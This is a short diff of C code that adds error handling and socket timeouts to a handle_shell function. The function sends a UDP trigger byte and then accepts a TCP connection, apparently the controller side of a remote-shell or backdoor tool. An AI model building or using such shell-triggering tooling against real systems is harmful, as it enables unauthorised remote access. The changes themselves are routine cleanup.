@@ -97,12 +97,17 @@ int handle_shell(struct sockaddr_in sa, int sockfd_u, char shll){
     if (setsockopt(sockfd_u, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
         perror("setsockopt");
         DBGLG("Could not set appropriate timeout\n");
-        exit(EXIT_FAILURE); 
+        close(sockfd_tc);
+        sleep(1);
+        return -EXIT_FAILURE; 
     }
     if (setsockopt(sockfd_u, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
         perror("setsockopt");
         DBGLG("Could not set appropriate timeout\n");
-        exit(EXIT_FAILURE); 
+        close(sockfd_tc);
+        sleep(1);
+        return -EXIT_FAILURE; 
+
     }
     listen_on_socket(sockfd_tc, 1);
     send_udp(sockfd_u, &sa, &shll, 1);
@@ -110,6 +115,16 @@ int handle_shell(struct sockaddr_in sa, int sockfd_u, char shll){
     if (((client_fd = accept(sockfd_tc, (struct sockaddr*) &sa, &junk)) < 0)){
         perror("failed to accept tcp: ");
         return -1;
+    }
+    if (setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
+        perror("setsockopt");
+        DBGLG("Could not set appropriate timeout\n");
+        
+        close(client_fd);
+        close(sockfd_tc);
+        sleep(1);
+        return -EXIT_FAILURE; 
+ 
     }
     sleep(1);
     DBGLG("Waiting for the responce\n");
